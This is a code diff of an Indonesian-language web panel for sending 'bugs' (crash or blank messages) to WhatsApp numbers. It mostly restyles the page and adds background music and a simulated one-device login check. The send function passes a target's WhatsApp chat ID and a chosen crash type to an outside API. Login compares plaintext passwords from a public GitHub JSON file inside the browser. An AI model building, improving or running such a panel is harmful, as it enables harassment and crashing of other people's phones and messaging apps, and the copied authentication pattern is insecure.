@@ -9,10 +9,11 @@
   <style>
     :root {
       --primary: #00ffc3;
-      --secondary: #0ff;
-      --background: #0a0a0a;
+      --secondary: #00d1ff;
+      --background: #050505;
       --text: #eeeeee;
       --glass: rgba(255, 255, 255, 0.05);
+      --glass-dark: rgba(0, 0, 0, 0.4);
     }
 
     * {
@@ -41,12 +42,12 @@
     }
 
     .glass-box {
-      background: var(--glass);
+      background: var(--glass-dark);
       border: 1px solid rgba(255, 255, 255, 0.1);
       border-radius: 20px;
       padding: 30px;
       backdrop-filter: blur(10px);
-      box-shadow: 0 0 25px rgba(255, 255, 255, 0.1);
+      box-shadow: 0 0 25px rgba(0, 255, 195, 0.15);
       z-index: 2;
       max-width: 400px;
       width: 100%;
@@ -61,12 +62,8 @@
     }
 
     @keyframes neonGlow {
-      from {
-        text-shadow: 0 0 10px var(--primary);
-      }
-      to {
-        text-shadow: 0 0 20px var(--secondary);
-      }
+      from { text-shadow: 0 0 10px var(--primary); }
+      to { text-shadow: 0 0 20px var(--secondary); }
     }
 
     input {
@@ -82,7 +79,7 @@
 
     input:focus {
       border-color: var(--primary);
-      background: rgba(255, 255, 255, 0.1);
+      background: rgba(0, 255, 195, 0.1);
       outline: none;
     }
 
@@ -103,6 +100,22 @@
       transform: scale(1.03);
     }
 
+    .music-btn {
+      margin-top: 15px;
+      background: var(--glass);
+      color: var(--primary);
+      border: 1px solid var(--primary);
+      border-radius: 12px;
+      padding: 10px 20px;
+      cursor: pointer;
+      text-align: center;
+      transition: all 0.3s ease;
+    }
+
+    .music-btn:hover {
+      background-color: rgba(0, 255, 195, 0.1);
+    }
+
     .bug-options {
       margin-top: 20px;
       display: flex;
@@ -111,7 +124,7 @@
     }
 
     .bug-card {
-      background: var(--glass);
+      background: var(--glass-dark);
       border: 1px solid rgba(255, 255, 255, 0.1);
       padding: 12px 16px;
       border-radius: 12px;
@@ -128,7 +141,7 @@
     }
 
     .bug-card:hover {
-      background: rgba(255, 255, 255, 0.1);
+      background: rgba(0, 255, 195, 0.1);
       transform: scale(1.02);
     }
 
@@ -172,7 +185,7 @@
     }
 
     .small-logout:hover {
-      background: rgba(255, 255, 255, 0.1);
+      background: rgba(0, 255, 195, 0.1);
     }
 
     #popup {
@@ -187,7 +200,7 @@
     }
 
     .popup-content {
-      background: #1a1a1a;
+      background: #0d0d0d;
       color: var(--primary);
       padding: 30px;
       border-radius: 15px;
@@ -224,7 +237,6 @@
 <body>
   <div id="particles-js"></div>
 
-  <!-- Popup -->
   <div id="popup">
     <div class="popup-content">
       <span class="close-btn" onclick="closePopup()">&times;</span>
@@ -232,7 +244,6 @@
     </div>
   </div>
 
-  <!-- Login -->
   <div id="login-box" class="glass-box">
     <h1>Login</h1>
     <input type="text" id="username" placeholder="Username" />
@@ -241,10 +252,9 @@
     <div id="login-result" style="margin-top:10px; text-align:center;"></div>
   </div>
 
-  <!-- Main -->
   <div class="glass-box" id="main-box" style="display:none;">
     <div class="profile">
-      <img src="https://files.catbox.moe/ktuerk.jpg" alt="profile">
+      <img src="https://files.catbox.moe/n1rn0e.jpeg" alt="profile">
       <div class="profile-info">
         <h2 id="userLabel">User</h2>
         <span class="status"><i class="fas fa-circle"></i> Connected</span>
@@ -259,26 +269,26 @@
       <div class="bug-card" data-bug="blank"><i class="fas fa-eye-slash"></i><span>Blank Message</span></div>
     </div>
     <button id="sendBtn" onclick="sendBug()"><i class="fas fa-bug"></i> Kirim Bug</button>
+    <button onclick="toggleMusic()" class="music-btn"><i class="fas fa-music"></i> Play/Pause Music</button>
+    <audio id="bg-music" loop><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mp3"></audio>
+    <audio id="effect-sound"><source src="https://www.soundjay.com/button/sounds/button-29.mp3" type="audio/mp3"></audio>
     <div class="small-logout" onclick="logout()">Logout</div>
     <div id="result" style="margin-top:15px; text-align:center;"></div>
     <div class="contact">
       <p>Contact Developer:</p>
-      <a href="https://t.me/leakvjs" target="_blank"><i class="fab fa-telegram"></i> @axpaw</a>
+      <a href="https://t.me/rzhhs" target="_blank"><i class="fab fa-telegram"></i> @Tirzz</a>
     </div>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
   <script>
-    // Ganti URL di bawah dengan raw link JSON dari GitHub Anda
     const GITHUB_USERDATA_URL = "https://raw.githubusercontent.com/Alfatrzz/web/refs/heads/main/users.json";
 
     async function getUsers() {
       try {
-        const response = await fetch(GITHUB_USERDATA_URL);
-        if (!response.ok) throw new Error("Gagal mengambil user dari GitHub.");
-        return await response.json();
-      } catch (error) {
-        console.error("Fetch error:", error);
+        const res = await fetch(GITHUB_USERDATA_URL);
+        return await res.json();
+      } catch {
         return [];
       }
     }
@@ -291,46 +301,56 @@
       return JSON.parse(sessionStorage.getItem("currentUser"));
     }
 
+    async function login() {
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const result = document.getElementById("login-result");
+      const users = await getUsers();
+      const user = users.find(u => u.username === username && u.password === password);
+
+      if (user) {
+        if (user.active) {
+          result.innerText = "❌ Akun sedang digunakan di perangkat lain!";
+          result.style.color = "crimson";
+          return;
+        }
+
+        saveSession(user);
+        showDashboard(user);
+
+        // Simulasikan update users.json
+        console.log(`[UPDATE] Set ${user.username} as active: true`);
+      } else {
+        result.innerText = "❌ Username atau Password salah!";
+        result.style.color = "crimson";
+      }
+    }
+
     function logout() {
+      const user = getSession();
+      if (user) {
+        console.log(`[UPDATE] Set ${user.username} as active: false`);
+      }
       sessionStorage.removeItem("currentUser");
       location.reload();
     }
 
-    window.onload = async () => {
+    window.onload = () => {
       const user = getSession();
       if (user) showDashboard(user);
     };
+
+    window.addEventListener("beforeunload", () => {
+      const user = getSession();
+      if (user) {
+        console.log(`[AUTO-LOGOUT] Set ${user.username} as active: false`);
+      }
+    });
 
     function showDashboard(user) {
       document.getElementById("login-box").style.display = "none";
       document.getElementById("main-box").style.display = "block";
       document.getElementById("userLabel").innerText = user.username;
-    }
-
-    function showPopup(message) {
-      document.getElementById("popup-message").innerHTML = message;
-      document.getElementById("popup").style.display = "flex";
-    }
-
-    function closePopup() {
-      document.getElementById("popup").style.display = "none";
-    }
-
-    async function login() {
-      const user = document.getElementById("username").value.trim();
-      const pass = document.getElementById("password").value.trim();
-      const result = document.getElementById("login-result");
-
-      const users = await getUsers();
-      const found = users.find(u => u.username === user && u.password === pass);
-
-      if (found) {
-        saveSession(found);
-        showDashboard(found);
-      } else {
-        result.innerText = "❌ Username atau Password salah!";
-        result.style.color = "crimson";
-      }
     }
 
     let selectedBug = "crashtotal";
@@ -355,13 +375,13 @@
 
       const chatId = input.includes("@s.whatsapp.net") ? input : `${input}@s.whatsapp.net`;
       btn.disabled = true;
-      const originalHTML = btn.innerHTML;
       btn.innerHTML = '<span class="spinner"></span> Mengirim...';
       resDiv.innerText = "";
 
       try {
         const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
         const json = await res.json();
+        document.getElementById("effect-sound").play();
         showPopup(`✅ Bug berhasil dikirim ke <b>${input}</b>`);
       } catch (err) {
         resDiv.innerText = "❌ Gagal fetch: " + err;
@@ -369,10 +389,23 @@
       }
 
       btn.disabled = false;
-      btn.innerHTML = originalHTML;
+      btn.innerHTML = '<i class="fas fa-bug"></i> Kirim Bug';
     }
 
-    // Partikel efek
+    function toggleMusic() {
+      const music = document.getElementById("bg-music");
+      music.paused ? music.play() : music.pause();
+    }
+
+    function showPopup(msg) {
+      document.getElementById("popup-message").innerHTML = msg;
+      document.getElementById("popup").style.display = "flex";
+    }
+
+    function closePopup() {
+      document.getElementById("popup").style.display = "none";
+    }
+
     particlesJS("particles-js", {
       particles: {
         number: { value: 60, density: { enable: true, value_area: 800 }},
